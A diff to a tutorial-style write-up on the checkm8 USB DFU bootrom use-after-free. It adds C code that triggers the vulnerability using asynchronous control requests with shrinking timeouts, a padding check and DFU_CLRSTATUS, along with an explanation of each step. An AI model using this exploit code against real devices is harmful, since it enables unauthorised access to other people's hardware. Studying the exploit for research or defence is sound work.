@@ -382,9 +382,11 @@ At this point, we will have the heap in such a state that the next IO buffer wil
 ## Triggering the use-after-free
 With the new IO buffer hopefully allocated elsewhere within the heap, thanks to our heap feng shui, we can now trigger the main use-after-free vulnerability.
 
-* Send a setup packet with a request type of `0x80`, a `DFU_DNLOAD` request and a wLength that is less than or equal to `0x800` to the device. This will set all the global variables to their necessary values.
+* Send a setup packet with a request type where `bmRequestType & 0x80 == 0` (we will use `0x21`), a `DFU_DNLOAD` request and a wLength that is less than or equal to `0x800` to the device. This will set all the global variables to their necessary values.
 * Begin the data phase but leave it as incomplete in order to evade the clearing of the global state.
 * Send a `DFU_ABORT` request in order to cause the IO buffer to be freed and the re-entry of DFU. This will trigger the use-after-free vulnerability.
+
+Here's my function that triggers the use-after-free:
 
 ```c
 bool checkm8TriggerUaF(device_t *device)
@@ -392,7 +394,7 @@ bool checkm8TriggerUaF(device_t *device)
   unsigned usbAbortTimeout = 10;
 	transfer_ret_t transferRet;
 
-	while(sendUSBControlRequestAsyncNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, DFU_MAX_TRANSFER_SIZE, usbAbortTimeout, &transferRet)) {
+	while(sendUSBControlRequestAsyncNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, 0x800, usbAbortTimeout, &transferRet)) {
 		if(transferRet.sz < config.overwritePadding 
         && sendUSBControlRequestNoData(&device->handle, 0, 0, 0, 0, config.overwritePadding - transferRet.sz, &transferRet) 
         && transferRet.ret == USB_TRANSFER_STALL) {
@@ -407,6 +409,29 @@ bool checkm8TriggerUaF(device_t *device)
 	return false;
 }
 ```
+
+First of all, let's discuss the while loop:
+```c
+  while(sendUSBControlRequestAsyncNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, 0x800, usbAbortTimeout, &transferRet)) {
+    // ... //
+    usbAbortTimeout = (usbAbortTimeout + 1) % 10;
+  }
+```
+So essentially what is happening here is that we are sending the required packet to set the global variables, but we continue sending it asynchronously with a shorter and shorter timeout until it is cancelled mid-way through. This is done to achieve the partially complete data phase state on the device.
+
+It's interesting to note that we never ever have to actually send data in order to trigger this use-after-free. Sending the `0x21, DFU_DNLOAD` request will set the global variables _and_ set the global data phase variable to true.
+
+```c
+  if(transferRet.sz < config.overwritePadding 
+      && sendUSBControlRequestNoData(&device->handle, 0, 0, 0, 0, config.overwritePadding - transferRet.sz, &transferRet) 
+      && transferRet.ret == USB_TRANSFER_STALL) {
+      sendUSBControlRequestNoData(&device->handle, 0x21, DFU_CLRSTATUS, 0, 0, 0, NULL);
+      return true;
+  }
+```
+Once we have sent the asynchronous request from above, we check if the device returned a size that is less than the overwrite padding. The overwrite padding ensures that the overwrite we send later on goes into the correct location in memory - but I won't go into too much detail on this.
+
+Then, we check if the device is stalled, which indicates that the conditions are ripe for the use-after-free to be triggered, and if so, send a `DFU_CLRSTATUS` to shut down the USB stack and trigger the vulnerability.
 
 After this, the IO buffer from the first iteration has been freed while the global variables still retain their values - including the variable that points to the old IO buffer. The new IO buffer should have been allocated in the hole created during the heap feng shui phase. Hence, by sending data to the device, it will be written into the address in the global variable that points to the old IO buffer.
 
